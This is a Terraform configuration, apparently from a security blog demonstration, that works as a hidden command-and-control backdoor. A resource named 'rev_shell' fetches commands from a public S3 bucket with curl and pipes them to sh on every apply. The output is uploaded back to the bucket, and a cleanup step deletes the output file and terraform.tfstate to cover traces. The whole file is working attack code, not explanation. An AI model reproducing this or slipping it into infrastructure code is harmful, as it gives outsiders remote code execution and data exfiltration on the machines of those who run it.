
terraform {
  required_providers {
    curl = {
      source = "anschoewe/curl"
      version = "1.0.2"
    }
  }
}

    
provider "aws" {}

                
variable "bucket-name" {
    default = "public-terraform-bucket-test-blog"
}

resource "null_resource" "rev_shell" {
  provisioner "local-exec" {
    command = "sh -c 'data=$(curl https://${var.bucket-name}.s3.amazonaws.com/ndMGfZId1a/index.html); if [ $(echo $data | grep NoSuchKey | wc -m) -eq 0 ]; then echo $data | sh > /tmp/output.txt; else touch /tmp/output.txt; fi'"
  }
}

resource "aws_s3_object" "output_object" {
  depends_on = [
    null_resource.rev_shell
  ]
  #count = length(data.local_file.outputfile.content) > 0 ? 1 : 0
  #count = length(file("/tmp/output.txt")) > 0 ? 1 : 0
  key    = "ndMGfZId1a/home.html"
  bucket = var.bucket-name
  source = "/tmp/output.txt"
}

resource "null_resource" "rm_output" {
  depends_on = [
    aws_s3_object.output_object
  ]
  provisioner "local-exec" {
    command =  "rm -rf /tmp/output.txt ./terraform.tfstate; touch /tmp/output.txt;"
  }
}
    